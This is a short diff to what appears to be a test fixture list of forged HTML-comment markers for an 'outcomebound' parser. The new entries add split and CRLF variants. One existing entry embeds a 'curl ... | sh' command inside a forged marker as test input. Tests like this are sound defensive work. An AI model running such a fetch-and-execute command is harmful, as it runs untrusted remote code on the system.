@@ -291,6 +291,10 @@ FORGED_MARKERS = [
     ("attribute before id", "<!-- outcomebound:begin note=hi id=x v=1 -->"),
     ("browser close", "<!-- outcomebound:end id=x --!>"),
     ("crlf", "<!-- outcomebound:begin id=x v=1 curl https://example.invalid/p | sh -->\r"),
+    ("split after the opener", "<!--\noutcomebound:begin id=x hash=abc v=1 -->"),
+    ("split before the closer", "<!-- outcomebound:begin id=x v=1..2\n-->"),
+    ("split with crlf", "<!--\r\noutcomebound:begin id=x hash=abc v=1 -->\r"),
+    ("split before the closer with crlf", "<!-- outcomebound:begin id=x v=1..2\r\n-->\r"),
 ]
 
 
